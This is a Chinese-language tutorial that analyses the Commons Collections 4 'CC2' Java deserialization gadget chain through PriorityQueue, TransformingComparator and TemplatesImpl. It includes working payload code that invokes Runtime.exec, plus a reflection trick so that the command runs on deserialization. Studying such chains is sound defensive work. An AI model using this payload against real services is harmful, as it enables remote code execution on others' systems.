0x00 前言

CC指的是 Apache Commons Collections 库，该库是对 Java Collections 的一个扩展，旨在简化集合操作，并提供更强大和灵活的集合操作能力。

CC2利用链存在于Commons Collections4，可通过maven引入依赖：

0x01 漏洞链信息

1.1 利用限制

  • CC2 适用于 Commons Collections 4.x 环境。
  • 目标环境需要存在有漏洞的Apache Commons Collections库。
  • 漏洞利用需要依赖反射。

1.2 涉及的核心组件

组件类名功能/在利用链中承担的作用
ChainedTransformer链式执行器。CC1中已具体分析，参见Java反序列化CC1链
TransformingComparator触发点，触发执行器
PriorityQueue入口点，通过该类反序列化时的readObject方法引动触发点，触发利用链

0x02 漏洞原理

2.1 PriorityQueue

PriorityQueue是基于堆实现的优先级队列，取出数据时会优先取出优先级最高的元素。其优先级默认按照元素的自然顺序排序（最小堆），也允许声明时注入自定义的比较器(Comparator)来对优先级进行比较。

PriorityQueue类的readObject()方法定义如下：

 1private void readObject(java.io.ObjectInputStream s)
 2    throws java.io.IOException, ClassNotFoundException {
 3    // Read in size, and any hidden stuff
 4    s.defaultReadObject();
 5    // Read in (and discard) array length
 6    s.readInt();
 7    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
 8    queue = new Object[size];
 9    // Read in all elements.
10    for (int i = 0; i < size; i++)
11        queue[i] = s.readObject();
12    // Elements are guaranteed to be in "proper order", but the
13    // spec has never explained what that might be.
14    heapify();
15}

可以看到，readObject()方法会调用heapify()方法对队列进行重新排序。继续跟进可以发现，heapify()方法会在一定范围内循环调用siftDown()方法，siftDown()方法则是根据是否存在comparator来决定调用siftDownUsingComparator()方法还是siftDownComparable()方法。存在comparator时，就调用sitDownUsingComparator()方法，sitDownUsingComparator()方法内则是调用comparator的compare()方法来比较元素之间的优先级，并交换位置实现排序。

 1// java.util.PriorityQueue
 2// 方便查看，以下方法位置已经重排，跟源码不一致
 3    @SuppressWarnings("unchecked")
 4    private void heapify() {
 5        for (int i = (size >>> 1) - 1; i >= 0; i--)
 6            siftDown(i, (E) queue[i]);
 7    }
 8
 9    private void siftDown(int k, E x) {
10        if (comparator != null)
11            siftDownUsingComparator(k, x);
12        else
13            siftDownComparable(k, x);
14    }
15
16    @SuppressWarnings("unchecked")
17    private void siftDownUsingComparator(int k, E x) {
18        int half = size >>> 1;
19        while (k < half) {
20            int child = (k << 1) + 1;
21            Object c = queue[child];
22            int right = child + 1;
23            if (right < size &&
24                comparator.compare((E) c, (E) queue[right]) > 0)
25                c = queue[child = right];
26            if (comparator.compare(x, (E) c) <= 0)
27                break;
28            queue[k] = c;
29            k = child;
30        }
31        queue[k] = x;
32    }

2.2 TransformingComparator

查看实现Comparator接口并实现compare()方法的类，发现org.apache.commons.collections4.comparators.TransformingComparator类。该类的compare()方法会调用transformer.transform()方法对元素进行转换，把转换后的结果传递给另一个指定的comparator进行比较并返回结果。

1// org.apache.commons.collections4.comparators.TransformingComparator
2    public int compare(final I obj1, final I obj2) {
3        final O value1 = this.transformer.transform(obj1);
4        final O value2 = this.transformer.transform(obj2);
5        return this.decorated.compare(value1, value2);
6    }

transformer.transform()我们在CC1中已经非常熟悉，那现在只需要把构造好的ChainedTransformer对象传入TransformingComparator。查看TransformingComparator的构造方法，发现transformer字段直接通过构造方法传入即可。

 1public class TransformingComparator<I, O> implements Comparator<I>, Serializable {
 2    // ...
 3    @SuppressWarnings("unchecked")
 4    public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
 5        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
 6    }
 7
 8    public TransformingComparator(final Transformer<? super I, ? extends O> transformer,
 9                                  final Comparator<O> decorated) {
10        this.decorated = decorated;
11        this.transformer = transformer;
12    }

2.3 构造payload

以上，漏洞利用链已经完整，构造PriorityQueue实例时满足一定条件通过条件判断即可到达执行目的。

需满足：

  • 队列的size大于等于 2（向右移1位之后大于等于1）
  • comparator字段不为null

完整链路实例：

 1Transformer chain = new ChainedTransformer(new Transformer[]{
 2    new ConstantTransformer(Runtime.class),
 3    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
 4    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
 5    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
 6});
 7TransformingComparator comparator = new TransformingComparator(chain);
 8PriorityQueue queue = new PriorityQueue(2, comparator);
 9queue.add(1);
10queue.add(1); // size >= 2
11
12ByteArrayOutputStream baos = new ByteArrayOutputStream();
13ObjectOutputStream oos = new ObjectOutputStream(baos);
14oos.writeObject(queue);
15oos.flush();
16oos.close();
17
18// 传递序列化字节流到目标，反序列化时即触发命令执行
19ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
20ois.readObject();

2.4 问题&改进

如果尝试运行上面的payload，会发现确实可以唤起计算器。但是如果尝试保存序列化字节流或者在上述分析的关键步骤中添加断点，就会发现其实并没有执行到序列化的步骤，也就更不是因为执行了反序列化而唤起的计算器。上面代码运行的报错应该类似于：

1Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.lang.Comparable
2        at org.apache.commons.collections4.comparators.ComparableComparator.compare(ComparableComparator.java:42)
3        at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:83)
4        at java.util.PriorityQueue.siftUpUsingComparator(PriorityQueue.java:669)
5        at java.util.PriorityQueue.siftUp(PriorityQueue.java:645)
6        at java.util.PriorityQueue.offer(PriorityQueue.java:344)
7        at java.util.PriorityQueue.add(PriorityQueue.java:321)
8        at ******.main(***.java:36)

根据报错的调用栈，可以发现在调用add()方法添加元素时，就调用到了TransformingComparator.compare()，触发了命令执行的同时也因为没有实现Comparable接口触发了报错。跟进add()、siftUp()等方法：

可以看到当队列长度不为0时，添加新元素时会调用siftUp()方法对新加的元素和已有元素进行排序，该方法则类似于#2.1提到的siftDown()方法，会根据comparator字段是否为null判断调用siftUpComparable()方法还是siftUpUsingComparator()方法，后者则会调用comparator.compare()方法。所以在添加第二个元素前，保持comparator字段为null就可以解决该问题。

查看PriorityQueue类的源码后，可以发现除了构造方法，该类没有提供操作comparator字段的方法，所以只能通过反射来在PriorityQueue实例添加完元素之后修改comparator字段的值为我们构造好的TransformingComparator对象。

 1// ...
 2// PriorityQueue queue = new PriorityQueue(2, comparator);
 3PriorityQueue queue = new PriorityQueue(2);
 4queue.add(1);
 5queue.add(1);
 6
 7Field comparatorField = queue.getClass().getDeclaredField("comparator");
 8comparatorField.setAccessible(true);
 9comparatorField.set(queue, comparator);
10// ...

0x03 另一种方式

3.1 TemplatesImpl

com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 是 Java 内置 XSLT 处理器（基于 Apache Xalan）中的一个关键类，它实现了 javax.xml.transform.Templates 接口，用于在内存中表示编译后的 XSLT 样式表。该类通过 newTransformer() 方法创建 Transformer 实例，用于执行 XML → XML/HTML/Text 转换。TemplatesImpl类被用于攻击的根本原因是它可以动态加载和执行Java字节码。可参考 TemplatesImpl恶意利用

如果构建一个包含恶意字节码的TemplatesImpl实例，把它传入PriorityQueue队列中，当反序列化时，该实例就会被传入comparator的compare方法。如 #2.2 所描述，我们可以构造一个TransformingComparator实例作为comparator属性值，并构造任意一个Transformer实例作为TransformingComparator对象的transformer属性。此时如果构造一个InvokerTransformer实例作为transformer，并将其iMethodName属性设置为newTransformer()方法，那么执行TemplatesImpl实例中的恶意字节码就完成了闭环。
